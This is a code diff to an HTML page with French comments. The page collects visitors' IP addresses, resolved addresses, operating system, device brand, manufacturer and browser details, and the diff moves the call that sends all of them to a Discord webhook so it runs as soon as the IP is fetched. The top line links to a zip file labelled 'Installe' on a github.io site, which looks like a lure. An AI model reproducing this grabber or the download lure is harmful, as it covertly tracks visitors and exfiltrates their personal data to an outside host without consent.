@@ -1,6 +1,5 @@
 <a href="https://pikayutmg.github.io/gr/CAT_MILK.deps.zip"> Installe //</a>
 
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -82,6 +81,18 @@
             getAddress(ip, function(address) {
                 document.getElementById('address').textContent = address;
             });
+
+            // Envoie les informations au webhook Discord
+            sendToDiscordWebhook({
+                ipAddress: ip,
+                address: document.getElementById('address').textContent,
+                operatingSystem: operatingSystem,
+                brand: brand,
+                manufacturer: manufacturer,
+                encoding: encoding,
+                browserType: browserType,
+                mobileManufacturer: mobileManufacturer
+            });
         });
 
         // Obtient le système d'exploitation de l'utilisateur
@@ -130,18 +141,7 @@
         document.getElementById('encoding').textContent = encoding;
         document.getElementById('browserType').textContent = browserType;
         document.getElementById('mobileManufacturer').textContent = mobileManufacturer;
-
-        // Envoie les informations au webhook Discord
-        sendToDiscordWebhook({
-            ipAddress: document.getElementById('ipAddress').textContent,
-            address: document.getElementById('address').textContent,
-            operatingSystem: operatingSystem,
-            brand: brand,
-            manufacturer: manufacturer,
-            encoding: encoding,
-            browserType: browserType,
-            mobileManufacturer: mobileManufacturer
-        });
     </script>
 </body>
 </html>
+
